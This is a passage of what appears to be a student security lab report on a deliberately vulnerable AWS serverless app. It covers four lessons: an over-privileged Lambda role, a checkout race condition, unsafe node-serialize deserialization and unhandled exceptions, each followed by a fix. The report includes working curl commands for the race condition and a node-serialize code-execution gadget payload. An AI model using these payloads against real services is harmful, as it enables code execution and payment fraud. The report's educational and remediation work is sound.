| DoS Attack | Excessive requests overwhelm system | Availability | Rate limiting | Requests rejected (429) | Not measured |

## Part 10) Takeaway / Lessons Learned

This lesson demonstrated how a Denial of Service attack can affect system availability.

By sending a large number of concurrent requests, the system became overwhelmed and returned server errors.

After applying rate limiting, the system was able to prevent the attack by rejecting excessive requests.

This highlights the importance of implementing traffic control mechanisms in cloud applications.


---

# Lesson #7: Over-Privileged Function

| Lesson summary: The SendReceipt Lambda function had more cloud permissions than its receipt-email task required. The IAM Policy Simulator showed broad S3 and DynamoDB actions allowed, which increases blast radius if the function is abused. |
| --- |

Main affected component: AWS Lambda execution role for DVSA-SEND-RECEIPT-EMAIL, IAM policies, S3, DynamoDB, SES

## Part 1) Goal and Vulnerability Summary

The goal of this lesson is to demonstrate that a Lambda execution role can be over-privileged. The affected component is the IAM policy attached to DVSA-SEND-RECEIPT-EMAIL. The security impact is privilege escalation within the AWS account context: if the function is compromised, an attacker can inherit permissions that are unrelated to sending receipt emails.

## Part 2) Why This Works / Root Cause

The root cause is excessive IAM permissions in the serverless template. The function policy used wildcard-style S3 and DynamoDB CRUD access rather than limiting the role to the receipt bucket and the orders table operations required for its business purpose. This violates the principle of least privilege.

## Part 3) Environment and Setup

DVSA function: DVSA-SEND-RECEIPT-EMAIL

Template/configuration file: template.yml

AWS tools used: IAM Policy Simulator, AWS Console, SAM/CloudFormation template review

Evidence videos: L7Vid_Proof.mp4 and L7Vid_Solution.mp4

## Part 4) Reproduction Steps

Open IAM Policy Simulator and select the execution role attached to DVSA-SEND-RECEIPT-EMAIL.

Select S3 actions such as s3:GetObject and s3:PutObject, then select DynamoDB actions such as dynamodb:GetItem, dynamodb:PutItem, dynamodb:DeleteItem, and dynamodb:Scan.

Run the simulation against wildcard or broad resources.

Confirm that actions unrelated to sending a receipt email are allowed.

Review template.yml and locate the policies that grant broad S3CrudPolicy and DynamoDBCrudPolicy access.

## Part 5) Evidence and Proof

The IAM Policy Simulator output shows that S3 GetObject/PutObject and DynamoDB GetItem/PutItem/DeleteItem/Scan were allowed. These actions are broader than the minimum required for sending a receipt email.

![Lesson 7 evidence 1](evidence/lesson-07-evidence-01.png)

_Figure L7-1: IAM Policy Simulator proof showing unnecessary S3 and DynamoDB permissions allowed for the receipt email role._

## Part 6) Fix Strategy / Probable Mitigation

The fix belongs in the Lambda execution-role policy and the SAM/CloudFormation template. The remediation should remove wildcard resource permissions, scope S3 access to the receipt bucket only, restrict DynamoDB access to the orders table only, and replace full CRUD access with read-only access where the function only needs to read order details.

## Part 7) Code / Config Changes

The vulnerable configuration used wildcard bucket and table values. The corrected configuration narrows S3 and DynamoDB access to the resources used by the receipt-email workflow.

|  |  |
| --- | --- |
| Figure L7-2a: Before - wildcard S3CrudPolicy and DynamoDBCrudPolicy. | Figure L7-2b: After - bucket-scoped S3 policy and read-only orders table policy. |

After: least-privilege policy scope

template.yml - remediation pattern for DVSA-SEND-RECEIPT-EMAIL

Policies: - S3CrudPolicy: BucketName: !Sub dvsa-receipts-bucket-${AWS::AccountId}-${AWS::Region} - DynamoDBReadPolicy: TableName: DVSA-ORDERS-DB - Version: '2012-10-17' Statement: - Effect: Allow Action: - ses:SendEmail - ses:SendRawEmail Resource: '*'

## Part 8) Verification After Fix

After remediation, the IAM Policy Simulator should deny access to unrelated S3 buckets, unrelated DynamoDB tables, DynamoDB DeleteItem, broad Scan where not required, and wildcard resource operations. The function should still be able to send receipts using the configured receipt bucket, the orders table read permission, and SES send permissions. The solution evidence is recorded in L7Vid_Solution.mp4.

## Part 9) Structured Operation and Security Analysis

The following tables summarize the intended behavior, evidence sources, observed deviation, and post-fix validation for this lesson.

## Table A - Intended rule, evidence sources, and observed behavior

| Vulnerability | Intended Rule(s) | Artifacts Used to Infer Rule | Normal Behavior Evidence | Exploit Behavior Evidence |
| --- | --- | --- | --- | --- |
| Lesson #7: Over-Privileged Function | The receipt-email Lambda role must have only the permissions needed to read receipt/order data and send an email. It must not have account-wide S3 or DynamoDB CRUD permissions. | IAM Policy Simulator, template.yml, Lambda function role, proof/solution videos. | A least-privilege role would allow only the receipt bucket, orders table read operations, and SES email actions. | Simulator showed s3:GetObject, s3:PutObject, dynamodb:GetItem, dynamodb:PutItem, dynamodb:DeleteItem, and dynamodb:Scan allowed beyond the function purpose. |

## Table B - Deviation classification, fix, and validation

| Vulnerability | Why This Is a Deviation | Deviation Class | Fix Applied (Where) | Post-Fix Verification | Optional Latency Before / After Logging |
| --- | --- | --- | --- | --- | --- |
| Lesson #7: Over-Privileged Function | The policy allowed cloud actions outside the intended receipt-email workflow, increasing blast radius if the function is compromised. | Accidental misconfiguration / security-relevant abuse potential | template.yml: replace wildcard bucket/table permissions with scoped S3 bucket access and DynamoDBReadPolicy on DVSA-ORDERS-DB. | Re-run simulator: unrelated S3/DynamoDB actions should be denied; legitimate receipt-email behavior remains allowed. | Not measured |

## Part 10) Takeaway / Lessons Learned

Serverless functions inherit their execution-role permissions. Even a small application bug becomes more serious when the function role can access unrelated resources. Least privilege should be enforced at deployment time and verified with policy simulation and CloudTrail-based permission review.


---

# Lesson #8: Logic Vulnerabilities

| Lesson summary: The checkout process allowed an order to remain mutable while billing was in progress. A late update could change the cart after billing began, so the paid amount and final order contents could become inconsistent. |
| --- |

Main affected component: Order billing workflow, order update workflow, DynamoDB order state, API Gateway/Lambda request sequencing

## Part 1) Goal and Vulnerability Summary

The goal is to demonstrate a business logic race condition in order billing. The affected components are new_order.py, order_billing.py, order update logic, and the DynamoDB order record. The impact is payment integrity failure: the user can be charged for one cart state while the final order records a different item quantity.

## Part 2) Why This Works / Root Cause

The vulnerable code checks orderStatus before billing, but the check is separated from the final DynamoDB update. Billing performs slow external operations after reading the item list. During that window, a second request can update the same order. Because the final write is not conditional, the function can commit payment information based on a stale snapshot.

## Part 3) Environment and Setup

API endpoint: POST $API/order through API Gateway

AWS services: API Gateway, Lambda, DynamoDB, payment/cart processing path

Files involved: new_order.py, order_billing.py, and order update logic

Tools used: browser DevTools, curl, shell background jobs, temporary files, CloudWatch as needed

Evidence videos: L8Vid_proof.mp4, L8Vid_problem1 Order Billing Function.mp4, L8Vid_problem2 Order Update.mp4, L8Vid_Solution.mp4

## Part 4) Reproduction Steps

Create or select an open order and save the order ID from local storage or the API response.

Send an update request that sets the order to a small quantity, such as one unit of item 1020.

Start the billing request in the background with valid billing data.

Wait briefly while the billing request is still processing.

Immediately send a second update request that changes the same order to a larger quantity, such as five units of item 1020.

Compare the billing response with the late update response and the final order state.

Command pattern used to reproduce the timing issue

Race-condition test shape; tokens/endpoints are stored in variables and not printed.

curl -sS -X POST "$API/order" -H "Content-Type: application/json" -H "Authorization: $JWT" -data '{"action":"update","order-id":"'"$ORDER_ID"'","items":{"1020":1}}' billing=$(mktemp); update=$(mktemp) curl -sS -X POST "$API/order" -H "Content-Type: application/json" -H "Authorization: $JWT" -data '{"action":"billing","order-id":"'"$ORDER_ID"'","data":{"ccn":"4111111111111111","exp":"12/30","cvv":"123"}}' > "$billing" & sleep 2 curl -sS -X POST "$API/order" -H "Content-Type: application/json" -H "Authorization: $JWT" -data '{"action":"update","order-id":"'"$ORDER_ID"'","items":{"1020":5}}' > "$update" wait cat "$billing"; cat "$update"

## Part 5) Evidence and Proof

In the vulnerable run, billing returned an amount for the smaller cart while the late update still returned cart updated. This proves that the order remained editable during or immediately after billing, creating a mismatch between payment and final order state. The supplied screenshot is cropped to remove JWT/API setup lines.

![Lesson 8 evidence 1](evidence/lesson-08-evidence-01.png)

_Figure L8-1: Proof of existence - billing completes while the late update still reports cart updated._

## Part 6) Fix Strategy / Probable Mitigation

The fix should enforce workflow state at the database write layer. Billing should atomically move an order from open to billing-in-progress before external calls. Updates should be accepted only while the order is open. Final payment completion should be conditional on the same locked state, so billing and update requests cannot both succeed against conflicting versions of the same order.

## Part 7) Code / Config Changes

Original design issue: mutable itemList stored as live checkout state

new_order.py creates an open/editable order state.

orderId = str(uuid.uuid4()) itemList = event["items"] status = 100 table.put_item( Item={ 'orderId': orderId, 'userId': userId, 'orderStatus': status, 'itemList': itemList, 'totalAmount': 0 } )

Remediation pattern: conditional DynamoDB writes

order_billing.py - lock before payment.

table.update_item( Key=order_key, UpdateExpression='SET orderStatus = :billingStatus', ConditionExpression='orderStatus = :openStatus AND itemList = :currentItems', ExpressionAttributeValues={ ':billingStatus': 115, ':openStatus': 100, ':currentItems': response["Item"]['itemList'] } ) # order_update.py - block late cart updates once billing starts. table.update_item( Key={"orderId": orderId, "userId": userId}, UpdateExpression='SET itemList = :itemList', ConditionExpression='orderStatus = :openStatus', ExpressionAttributeValues={ ':itemList': itemList, ':openStatus': 100 } )

## Part 8) Verification After Fix

After the fix, the same race test was repeated. Billing still completed for the locked order, but the late update was rejected with order already paid. This confirms that the vulnerable behavior no longer succeeds and that the normal billing path remains functional.

![Lesson 8 evidence 2](evidence/lesson-08-evidence-02.png)

_Figure L8-2: Solution verification - the late update is rejected after the order enters a protected state._

## Part 9) Structured Operation and Security Analysis

The following tables summarize the intended behavior, evidence sources, observed deviation, and post-fix validation for this lesson.

## Table A - Intended rule, evidence sources, and observed behavior

| Vulnerability | Intended Rule(s) | Artifacts Used to Infer Rule | Normal Behavior Evidence | Exploit Behavior Evidence |
| --- | --- | --- | --- | --- |
| Lesson #8: Logic Vulnerabilities | After billing begins, the order snapshot used for payment must not be modified. Billing and item updates must be coordinated with atomic state transitions. | Browser workflow, local storage order ID, curl requests, billing/update responses, source code in new_order.py and order_billing.py, proof/solution screenshots. | Open orders can be updated before checkout; billing should lock the order and charge exactly the locked item snapshot. | Billing returned amount 25 while the late update response still reported cart updated, proving conflicting order states could both succeed. |

## Table B - Deviation classification, fix, and validation

| Vulnerability | Why This Is a Deviation | Deviation Class | Fix Applied (Where) | Post-Fix Verification | Optional Latency Before / After Logging |
| --- | --- | --- | --- | --- | --- |
| Lesson #8: Logic Vulnerabilities | The exploit violates payment integrity because the final order state can differ from the state used to calculate payment. | Intentional misuse / security-relevant abuse | order_billing.py and order_update.py: add conditional DynamoDB writes, billing-in-progress state, and update rejection after checkout begins. | Repeated timing test: billing succeeds but late update returns order already paid/rejected; normal checkout remains available. | Not measured |

## Part 10) Takeaway / Lessons Learned

Input validation alone cannot fix a race condition. Serverless workflows that span multiple Lambda invocations and external calls must use atomic state transitions, conditional writes, or idempotency controls so business rules are enforced at commit time.


---

# Lesson #9: Vulnerable Dependencies

| Lesson summary: The order manager used a vulnerable dependency and unsafe deserialization on untrusted request data. A crafted node-serialize payload executed a marker inside the Lambda runtime, proving practical exploitability. |
| --- |

Main affected component: DVSA-ORDER-MANAGER Lambda, order-manager.js, node-serialize package, CloudWatch Logs

## Part 1) Goal and Vulnerability Summary

The goal is to demonstrate that a vulnerable third-party package can become the real entry point for compromise. The affected component is order-manager.js, which used node-serialize to deserialize the request body and headers. The impact is code execution in the Lambda context, followed by any permissions available to that Lambda role.

## Part 2) Why This Works / Root Cause

The root cause is unsafe deserialization of attacker-controlled input. The vulnerable code used serialize.unserialize(event.body) and serialize.unserialize(event.headers). node-serialize function gadgets can be interpreted in a dangerous way, allowing a crafted payload to run code during deserialization.

## Part 3) Environment and Setup

API endpoint: POST $API/order

Lambda function: DVSA-ORDER-MANAGER

Source file: backend/functions/processing/order-manager.js

Verification source: CloudWatch Logs marker string L9_V_Karrar

Tools used: curl, AWS CLI logs tail, CloudWatch Logs

Evidence videos: L9Vid_Proof.mp4 and L9Vid_Solution.mp4

## Part 4) Reproduction Steps

Prepare a JSON payload that contains a node-serialize function gadget and a unique marker string.

Send the payload to POST /dvsa/order using curl and a valid authorization token stored in a shell variable.

Observe that the API may return a generic error such as HTTP 502 because the backend execution path is not client-safe.

Query CloudWatch Logs for the unique marker string.

Confirm that the marker was printed inside the DVSA-ORDER-MANAGER Lambda log stream.

Exploit and verification command pattern

read -r -d '' BODY << 'EOF' {"action":"orders","dep_poc":"_$$ND_FUNC$$_function(){console.log("L9_V_Karrar")}()"} EOF curl -i -s -X POST"$API/order" -H "Content-Type: application/json" -H "Authorization: $JWT" -d "$BODY" aws logs tail /aws/lambda/DVSA-ORDER-MANAGER -since 10m -region us-east-1 | grep "L9_V_Karrar"

## Part 5) Evidence and Proof

The terminal output shows the crafted payload sent to the order endpoint, followed by CloudWatch evidence that the marker L9_V_Karrar executed inside DVSA-ORDER-MANAGER. The setup lines containing the API endpoint and JWT are cropped out.

![Lesson 9 evidence 1](evidence/lesson-09-evidence-01.png)

_Figure L9-1: Proof that the node-serialize gadget marker executed inside the Lambda logs._

![Lesson 9 evidence 2](evidence/lesson-09-evidence-02.png)

_Figure L9-2: Vulnerable order-manager.js code using serialize.unserialize on event.body and event.headers._

## Part 6) Fix Strategy / Probable Mitigation

The fix belongs in order-manager.js and dependency management. The function should not deserialize request data with node-serialize. It should parse JSON using JSON.parse inside a defensive helper, validate the request shape, require a valid Authorization header, and allowlist known actions before invoking downstream Lambda functions. The unsafe dependency should be removed from package.json and replaced with safe standard JSON parsing.

## Part 7) Code / Config Changes

Before

// Before: unsafe deserialization of untrusted input. var req = serialize.unserialize(event.body); var headers = serialize.unserialize(event.headers);

After

// After: safe JSON parsing and authentication guard. function safeParseJson(raw, fallback = {}) { if (!raw) return fallback; if (typeof raw === "object") return raw; try { return JSON.parse(raw); } catch (e) { return fallback; } } function unauthorizedResponse(callback) { callback(null, { statusCode: 401, headers: { "Access-Control-Allow-Origin": "" }, body: JSON.stringify({ "status": "err", "message": "Unauthorized" }) }); } exports.handler = (event, context, callback) => { var req = safeParseJson(event.body, {}); var headers = safeParseJson(event.headers, {}); var auth_header = headers.Authorization || headers.authorization; if (!auth_header) return unauthorizedResponse(callback); var action = req.action; switch (action) { case "new": case "update": case "cancel": case "get": case "orders": case "billing": // invoke the approved downstream function for this action break; default: callback(null, { statusCode: 200, headers: { "Access-Control-Allow-Origin": "" }, body: JSON.stringify({"status":"err", "msg":"unknown action"}) }); } };

## Part 8) Verification After Fix

The exploit payload should no longer execute because the request body is parsed as JSON data instead of being interpreted by node-serialize. Replaying the same payload should either be rejected as an unknown or invalid action, or processed only as inert data. CloudWatch should contain no new L9_V_Karrar execution marker after the fix. The post-fix demonstration is documented in L9Vid_Solution.mp4.

## Part 9) Structured Operation and Security Analysis

The following tables summarize the intended behavior, evidence sources, observed deviation, and post-fix validation for this lesson.

## Table A - Intended rule, evidence sources, and observed behavior

| Vulnerability | Intended Rule(s) | Artifacts Used to Infer Rule | Normal Behavior Evidence | Exploit Behavior Evidence |
| --- | --- | --- | --- | --- |
| Lesson #9: Vulnerable Dependencies | Request bodies and headers must be treated as data. The order manager must not deserialize untrusted input with a package that can interpret executable function payloads. | order-manager.js, package dependency, curl payload, API response, CloudWatch logs, proof/solution videos. | A valid request is parsed as JSON, mapped to an allowlisted action, and routed to the correct downstream Lambda. | Crafted node-serialize payload printed L9_V_Karrar inside DVSA-ORDER-MANAGER CloudWatch logs. |

## Table B - Deviation classification, fix, and validation

| Vulnerability | Why This Is a Deviation | Deviation Class | Fix Applied (Where) | Post-Fix Verification | Optional Latency Before / After Logging |
| --- | --- | --- | --- | --- | --- |
| Lesson #9: Vulnerable Dependencies | The request body was treated as executable content, violating the rule that untrusted client input must remain data only. | Intentional misuse / security-relevant abuse | order-manager.js and package dependencies: remove node-serialize usage; implement safeParseJson, authorization checks, and action allowlisting. | Replay gadget payload; no marker appears in CloudWatch and request is handled as inert data or rejected. | Not measured |

## Part 10) Takeaway / Lessons Learned

Dependency risk is application risk. In serverless systems, a vulnerable package inside a Lambda deployment can directly expose the Lambda runtime and its IAM role. Avoid unsafe deserialization, keep dependency inventories small, and scan/pin packages during deployment.


---

# Lesson #10: Unhandled Exceptions

| Lesson summary: Malformed payment input caused an uncaught Python exception in the payment processor. Instead of returning a controlled validation error, the backend crashed and produced internal error evidence in API/CloudWatch output. |
| --- |

Main affected component: DVSA-PAYMENT-PROCESSOR Lambda, payment_processing.py, API Gateway error handling, CloudWatch Logs

## Part 1) Goal and Vulnerability Summary

The goal is to show that malformed input can trigger unhandled exceptions in backend Lambda code. The affected component is payment_processing.py in DVSA-PAYMENT-PROCESSOR. The impact is availability and information disclosure: malformed requests produce backend failure and logs reveal the crash location and exception type.

## Part 2) Why This Works / Root Cause

The root cause is unsafe parsing and missing validation. The original code assumed that exp always had the MM/YY format and directly accessed data["exp"].split("/")[1]. When exp is malformed, the list index does not exist and Python raises IndexError instead of returning a controlled error response.

## Part 3) Environment and Setup

API endpoint: POST $API/payment

Lambda function: DVSA-PAYMENT-PROCESSOR

Source file: backend/functions/processing/payment_processing.py

Verification source: CloudWatch Logs traceback and post-fix normal invocation logs

Tools used: curl, AWS CLI logs tail, CloudWatch Logs

Evidence videos: L10Vid_Proof.mp4 and L10Vid_Solution.mp4

## Part 4) Reproduction Steps

Send a payment request with valid-looking ccn and cvv values but a malformed expiration value, such as exp set to 12 instead of MM/YY.

Observe the API response. The vulnerable behavior returns a backend failure such as HTTP 502/InternalServerErrorException.

Tail the DVSA-PAYMENT-PROCESSOR CloudWatch log stream.

Confirm that the logs contain LAMBDA_WARNING: Unhandled exception and a Python traceback pointing to payment_processing.py at the expiration parsing line.

Malformed payment request used for proof

curl -i -s -X POST "$API/payment" -H "Content-Type: application/json" -d '{"ccn":"4242424242424242","exp":"12","cvv":"123"}' aws logs tail /aws/lambda/DVSA-PAYMENT-PROCESSOR -since 10m -region us-east-1

## Part 5) Evidence and Proof

The vulnerable code directly accesses split("/")[1], and the proof output shows an IndexError traceback in CloudWatch after a malformed exp value. Setup lines containing API/JWT values are cropped out of the terminal evidence.

![Lesson 10 evidence 1](evidence/lesson-10-evidence-01.png)

_Figure L10-1: Vulnerable expiration parsing in payment_processing.py assumes exp has MM/YY format._

![Lesson 10 evidence 2](evidence/lesson-10-evidence-02.png)

_Figure L10-2: Proof of exploitation - malformed exp causes HTTP 502 and CloudWatch IndexError traceback._

## Part 6) Fix Strategy / Probable Mitigation

The fix belongs in payment_processing.py. The function should parse JSON safely, validate that the request body is an object, verify that ccn and cvv contain expected digits, verify that exp has exactly two slash-separated parts, and catch conversion errors before using expiration values in date comparisons. Client responses should be controlled and generic; detailed diagnostics should remain in CloudWatch only.

## Part 7) Code / Config Changes

Before

Before: crash-prone parsing.

data = json.loads(event["body"]) ccn = data['ccn'] exp_m = int(data['exp'].split("/")[0]) exp_y = int(data['exp'].split("/")[1]) + 2000

After

After: defensive request parsing and expiration validation.

try: raw_body = event.get("body", "{}") data = json.loads(raw_body) if isinstance(raw_body, str) else raw_body except Exception: return {'statusCode': 400, 'body': json.dumps({"status": 110, "msg": "invalid request format"})} if not isinstance(data, dict): return {'statusCode': 400, 'body': json.dumps({"status": 110, "msg": "invalid request format"})} ccn = str(data.get('ccn', "")) exp = str(data.get('exp',"")) cvv = str(data.get('cvv',"")) if not ccn.isdigit(): return {'statusCode': 200, 'body': json.dumps({"status": 110, "msg": "invalid payment data"})} exp_parts = exp.split("/") if len(exp_parts) != 2: return {'statusCode': 200, 'body': json.dumps({"status": 110, "msg": "invalid expiration date"})} try: exp_m = int(exp_parts[0]) exp_y = int(exp_parts[1]) + 2000 except ValueError: return {'statusCode': 200, 'body': json.dumps({"status": 110, "msg": "invalid expiration date"})}

## Part 8) Verification After Fix

After the fix, the same malformed expiration request returns a controlled response such as invalid expiration date. The CloudWatch log shows normal START/END/REPORT records without an unhandled-exception traceback for the malformed input case.

![Lesson 10 evidence 3](evidence/lesson-10-evidence-03.png)

_Figure L10-3: Post-fix verification - malformed exp is rejected safely and logs do not show a traceback._

## Part 9) Structured Operation and Security Analysis

The following tables summarize the intended behavior, evidence sources, observed deviation, and post-fix validation for this lesson.

## Table A - Intended rule, evidence sources, and observed behavior

| Vulnerability | Intended Rule(s) | Artifacts Used to Infer Rule | Normal Behavior Evidence | Exploit Behavior Evidence |
| --- | --- | --- | --- | --- |
| Lesson #10: Unhandled Exceptions | Malformed client input must be rejected through controlled validation paths. Backend code must not assume request fields are present or correctly formatted. | payment_processing.py, curl malformed request, API response, CloudWatch traceback, post-fix logs, proof/solution videos. | Valid payment data is processed; invalid payment data returns an application-level error without crashing the Lambda. | Request with exp="12" returned HTTP 502 and CloudWatch showed IndexError at payment_processing.py expiration parsing. |

## Table B - Deviation classification, fix, and validation

| Vulnerability | Why This Is a Deviation | Deviation Class | Fix Applied (Where) | Post-Fix Verification | Optional Latency Before / After Logging |
| --- | --- | --- | --- | --- | --- |
| Lesson #10: Unhandled Exceptions | The function allowed malformed input to reach crash-prone parsing and exposed internal failure details through logs/API behavior. | Intentional misuse / security-relevant abuse | payment_processing.py: add safe JSON parsing, type checks, field validation, guarded expiration split, and ValueError handling. | Replay malformed request; response is invalid expiration date/invalid request format and CloudWatch has no unhandled exception traceback. | Not measured |

## Part 10) Takeaway / Lessons Learned

Unhandled exceptions are both reliability and security problems. In serverless applications, a single malformed request can produce noisy failures, leak implementation details, and hide the real problem behind API Gateway 502 errors. Defensive validation and centralized error handling keep backend failures controlled.

Evidence Inventory and Final Notes

The following named video files were referenced by the source work and should be submitted alongside the report if the course deliverables require demo recordings.

Video evidence inventory

| Lesson | Proof / Problem Explanation | Solution / Verification |
| --- | --- | --- |
| Lesson 7 | L7Vid_Proof.mp4 | L7Vid_Solution.mp4 |
| Lesson 8 | L8Vid_proof.mp4; L8Vid_problem1 Order Billing Function.mp4; L8Vid_problem2 Order Update.mp4 | L8Vid_Solution.mp4 |
| Lesson 9 | L9Vid_Proof.mp4 | L9Vid_Solution.mp4 |
| Lesson 10 | L10Vid_Proof.mp4 | L10Vid_Solution.mp4 |

| Submission checklist: Before final submission, fill in the cover-page student details and confirm that every screenshot remains redacted. Do not include raw JWTs, AWS credentials, session tokens, or valid API secrets in the submitted copy. |
| --- |
